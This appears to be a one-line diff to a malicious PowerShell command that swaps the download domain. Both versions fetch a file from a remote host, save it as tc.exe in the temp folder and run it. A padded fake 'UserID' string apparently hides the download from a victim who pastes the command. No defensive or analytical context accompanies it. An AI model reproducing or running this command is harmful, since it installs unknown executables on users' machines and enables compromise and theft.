@@ -1,1 +1,1 @@
-powershell -c "iwr 'https://mellstroyappgame.foundation/mini.txt' -o $env:TEMP\\tc.exe; & $env:TEMP\\tc.exe; Write-Host '                                                 UserID:63994529832'"
+powershell -c "iwr 'https://agency-portals.com/carrier-onboarding.txt' -o $env:TEMP\\tc.exe; & $env:TEMP\\tc.exe; Write-Host '                                                 UserID:63994529832'"
